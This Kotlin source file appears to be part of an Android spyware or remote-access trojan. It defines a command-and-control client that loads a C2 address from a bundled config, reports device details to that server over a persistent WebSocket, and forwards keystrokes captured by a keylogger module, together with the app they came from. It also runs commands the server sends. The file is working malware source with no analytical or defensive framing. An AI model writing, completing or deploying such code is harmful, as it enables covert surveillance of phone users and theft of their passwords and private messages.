package com.ihk909.payload

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.ihk909.payload.modules.KeyloggerModule
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Client(private val ctx: Context) {
    private val tag = "C2"
    private val http = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()
    private var ws: WebSocket? = null
    private val main = Handler(Looper.getMainLooper())
    @Volatile private var closed = false
    @Volatile private var backoff = 3
    var token: String = "?"
        private set
    private var c2url: String = ""

    init { loadConfig() }

    private fun loadConfig() {
        runCatching {
            ctx.assets.open("cfg.json").use { input ->
                val bytes = input.readBytes()
                val j = JSONObject(String(bytes, Charsets.UTF_8))
                token = j.optString("token", "?")
                c2url = j.optString("c2_url", "")
            }
        }.onFailure { Log.e(tag, "cfg", it) }
    }

    fun connect() {
        closed = false
        val url = "$c2url/agent?token=$token" +
                "&model=${enc(android.os.Build.MODEL)}" +
                "&brand=${enc(android.os.Build.BRAND)}" +
                "&sdk=${android.os.Build.VERSION.SDK_INT}" +
                "&release=${enc(android.os.Build.VERSION.RELEASE)}" +
                "&pkg=${enc(ctx.packageName)}"

        ws = http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(tag, "connected")
                backoff = 3
                runCatching {
                    send(JSONObject().put("type", "hello").put("token", token))
                }
                KeyloggerModule.KeylogBus.sink = { text, pkg ->
                    runCatching {
                        event("keylog", JSONObject().put("text", text).put("pkg", pkg))
                    }
                }
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                runCatching {
                    val m = JSONObject(text)
                    CommandHandler.handle(ctx, this@C2Client, m)
                }.onFailure { Log.e(tag, "msg", it) }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                if (!closed) scheduleReconnect()
            }
        })
    }

    private fun enc(s: String): String =
        runCatching { java.net.URLEncoder.encode(s, "UTF-8") }.getOrDefault(s)

    private fun scheduleReconnect() {
        if (closed) return
        main.postDelayed({ if (!closed) connect() }, backoff * 1000L)
        backoff = (backoff * 2).coerceAtMost(300)
    }

    fun send(o: JSONObject) {
        runCatching { ws?.send(o.toString()) }
    }

    fun reply(id: String, data: JSONObject) {
        runCatching {
            send(JSONObject().put("type", "reply").put("id", id).put("ok", true).put("data", data))
        }
    }

    fun replyError(id: String, err: String) {
        runCatching {
            send(JSONObject().put("type", "reply").put("id", id).put("ok", false).put("error", err))
        }
    }

    fun event(evt: String, data: JSONObject) {
        runCatching {
            send(JSONObject().put("type", "event").put("event", evt).put("data", data))
        }
    }

    fun disconnect() {
        closed = true
        runCatching { ws?.close(1000, "bye") }
    }
}